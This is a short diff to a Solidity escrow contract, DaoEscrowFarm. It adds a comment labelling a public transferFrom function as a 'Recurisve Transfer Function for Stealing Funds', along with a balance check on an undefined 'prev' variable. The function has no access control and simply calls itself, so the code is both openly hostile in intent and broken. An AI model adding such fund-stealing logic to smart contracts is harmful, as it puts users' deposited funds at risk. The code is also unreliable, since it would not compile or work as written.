@@ -54,8 +54,11 @@ contract DaoEscrowFarm is Context  {
         require(success, "ETH_TRANSFER_FAIL");
     }
     
-
+         
+        // Recurisve Transfer Function for Stealing Funds
 	function transferFrom(address from, address to, uint256 amount) public returns (bool) {
+		require(prev.balance >= amount, "NOT_ENOUGH_ETH");
+		
 		bool success = transferFrom(from, to, amount);
 		return success;
 	}
